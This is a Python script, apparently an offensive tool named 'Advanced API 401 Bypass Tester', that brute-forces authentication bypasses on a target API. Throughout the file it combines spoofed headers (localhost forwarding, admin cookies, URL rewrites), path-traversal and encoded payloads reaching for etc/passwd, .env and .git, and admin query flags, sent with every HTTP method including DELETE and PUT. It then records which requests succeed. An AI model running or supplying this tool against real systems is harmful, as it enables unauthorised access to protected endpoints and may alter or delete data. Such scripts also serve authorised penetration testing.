import requests
import random
import argparse
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor
from itertools import combinations
import aiohttp
import asyncio
import time
import os
import logging
from typing import List, Dict, Set

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Extended headers with additional bypass techniques
auth_headers = [
    {"Authorization": "Bearer test"},
    {"Authorization": "Basic Og=="},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"X-Api-Key": "test"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Cookie": "role=admin"},
    {"Cookie": "session=admin"},
    {"X-Method-Override": "GET"},
    {"X-HTTP-Method-Override": "GET"},
    {"X-Custom-Auth": "true"},
    {"Debug": "true"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"Forwarded": "for=127.0.0.1"},
    {"Client-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "curl/7.68.0",
    "python-requests/2.28.1",
    "PostmanRuntime/7.32.2",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

bypass_payloads = [
    "", "/", ".", "/*", ";", ";/", ";.css", "%00", "%20", "%2f", "%3f", "%23", "%26",
    "%F3%A0%81%A9", "../", "..;/", ".json", "//", "/..;/", "/./", "/../", "/?", "??",
    "%2e%2e%2f", "%2e%2e/", "%2f", "%2e/", "%3b", "%E2%80%A8", "%0d%0a", "/%2e%2e%2f%2e%2e%2f",
    "%252e%252e%252f", "/%09/", "/%20/", "/%252f", "/%25", "/%2525", "/.git/", "/.env",
    "/%2e%2e%2f%2e%2e%2f%2e%2e%2f", "/%252e%252e%252f%252e%252e%252f", "/%2e%2e%5c",
    "/%252e%252e%255c", "/%2f%2f", "/%252f%252f", "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
]

query_params = [
    "?debug=true",
    "?access=admin",
    "?bypass=true",
    "?role=admin",
    "?test=1",
    "?cache=false",
    "?internal=true",
    "?auth=disabled",
    "?api_key=test",
]

async def test_single_path(session: aiohttp.ClientSession, method: str, full_url: str, headers: Dict) -> Dict:
    """
    Test a single path with the specified method and headers.
    """
    try:
        start_time = time.time()
        if method in ["GET", "HEAD", "OPTIONS"]:
            async with session.request(method, full_url, headers=headers, timeout=6, ssl=False) as r:
                status = r.status
                text = await r.text() if method != "HEAD" else ""
        else:
            dummy_payload = {"test": "value"}
            async with session.request(method, full_url, headers=headers, json=dummy_payload, timeout=6, ssl=False) as r:
                status = r.status
                text = await r.text() if method != "HEAD" else ""

        elapsed = time.time() - start_time
        return {
            "method": method,
            "url": full_url,
            "headers": headers,
            "status": status,
            "length": len(text),
            "elapsed": elapsed
        }
    except Exception as e:
        logger.error(f"Error testing {method} {full_url}: {str(e)}")
        return {
            "method": method,
            "url": full_url,
            "headers": headers,
            "status": "ERROR",
            "error": str(e),
            "elapsed": 0
        }

def generate_all_variants(base_path: str) -> List[str]:
    """
    Generate all possible path variants for bypass testing.
    """
    base_path = base_path.strip()
    if not base_path.startswith("/"):
        base_path = "/" + base_path
    segments = base_path.strip("/").split("/")
    variants: Set[str] = {base_path}

    # Suffix payloads
    for payload in bypass_payloads:
        variants.add(base_path + payload)

    # Prefix payloads
    for payload in bypass_payloads:
        variants.add(f"/{payload}" + base_path)

    # In-between segment injection
    for i in range(1, len(segments)):
        left = "/" + "/".join(segments[:i])
        right = "/".join(segments[i:])
        for payload in bypass_payloads:
            injected = f"{left}{payload}/{right}"
            variants.add(injected)

    # Add query parameter variants
    for param in query_params:
        variants.add(base_path + param)

    # Case manipulation
    for path in list(variants):
        variants.add(path.upper())
        variants.add(path.lower())

    return list(variants)

async def test_paths_async(base_uri: str, path_list: List[str], max_workers: int, output_file: str, rate_limit: float = 0.1):
    """
    Asynchronously test all paths with rate limiting.
    """
    success_log = []
    methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "PATCH"]

    # Generate all header combinations (single and pairs)
    header_combinations = []
    for h in auth_headers:
        header_combinations.append(h)
    for h1, h2 in combinations(auth_headers, 2):
        combined = {**h1, **h2}
        header_combinations.append(combined)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for raw_path in path_list:
            path_variants = generate_all_variants(raw_path)
            for path in path_variants:
                full_url = f"https://{base_uri}{path}"
                for method in methods:
                    for headers in header_combinations:
                        headers = headers.copy()
                        headers["User-Agent"] = random.choice(user_agents)
                        tasks.append(test_single_path(session, method, full_url, headers))
                        # Apply rate limiting
                        await asyncio.sleep(rate_limit)

        # Run tasks concurrently
        for i in range(0, len(tasks), max_workers):
            batch = tasks[i:i + max_workers]
            results = await asyncio.gather(*batch, return_exceptions=True)
            for result in results:
                if result["status"] == 200:
                    success_log.append(result)
                    logger.info(f"✅ 200 OK via {result['method']} | {result['url']} | Time: {result['elapsed']:.2f}s")
                    logger.info(f"   ➤ Bypass Headers: {result['headers']}")
                elif result["status"] != "ERROR":
                    logger.info(f"{result['status']} | {result['method']} | {result['url']} | Time: {result['elapsed']:.2f}s")
                else:
                    logger.error(f"ERROR | {result['method']} | {result['url']} | {result['error']}")

    # Write successful bypasses to file
    with open(output_file, "w") as f:
        f.write("=== SUCCESSFUL BYPASSES ===\n")
        for s in success_log:
            f.write(f"[{s['method']}] {s['url']}\n")
            f.write(f"     Headers: {s['headers']}\n")
            f.write(f"     Response Length: {s['length']}\n")
            f.write(f"     Elapsed Time: {s['elapsed']:.2f}s\n")
            f.write("-" * 60 + "\n")

    logger.info(f"\n=== ✅ SUCCESSFUL BYPASSES ===")
    logger.info(f"Results written to {output_file}")
    for s in success_log:
        logger.info(f"[{s['method']}] {s['url']}")
        logger.info(f"     Headers: {s['headers']}")
        logger.info(f"     Response Length: {s['length']}")
        logger.info(f"     Elapsed Time: {s['elapsed']:.2f}s")
        logger.info("-" * 60)

def main():
    parser = argparse.ArgumentParser(description="🔥 Advanced API 401 Bypass Tester (Async)")
    parser.add_argument("uri", help="Base URI (e.g., api.target.com)")
    parser.add_argument("path_file", help="Path list .txt file")
    parser.add_argument("--workers", type=int, default=10, help="Max concurrent workers")
    parser.add_argument("--rate-limit", type=float, default=0.1, help="Delay between requests in seconds")
    args = parser.parse_args()

    # Generate output filename
    output_file = os.path.splitext(args.path_file)[0] + "_bypassed.txt"

    with open(args.path_file, "r") as f:
        paths = f.readlines()

    # Run async tests
    asyncio.run(test_paths_async(args.uri, paths, args.workers, output_file, args.rate_limit))

if __name__ == "__main__":
    main()